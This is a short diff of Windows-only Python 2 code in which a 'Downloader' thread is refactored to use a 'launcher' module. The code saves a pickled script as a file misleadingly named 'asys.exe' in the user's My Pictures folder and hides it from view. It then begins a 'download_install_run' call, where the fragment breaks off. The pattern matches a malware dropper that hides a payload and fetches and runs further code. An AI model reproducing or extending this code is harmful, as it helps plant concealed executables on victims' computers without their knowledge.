@@ -3,6 +3,7 @@
 Should only be run on windows :(
 """
 import cPickle
+import launcher
 import threading
 
 from win32com.shell import shell, shellcon
@@ -19,15 +20,15 @@ class Downloader(threading.Thread):
     def run(self):
         """Run the thread."""
         #Make a file for the script
-        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "asys.exe")
+        path = launcher.file_in_special_path(shellcon.CSIDL_MYPICTURES, "asys.exe")
         print path
-        unhide_file(path)
+        launcher.unhide_file(path)
         f = open(path, "w")
         #Save the script
         cPickle.dump(self.script, f)
         #Hide the script
         f.close()
-        hide_file(path)
+        launcher.hide_file(path)
         
         #DIR the launcher
         download_install_run(
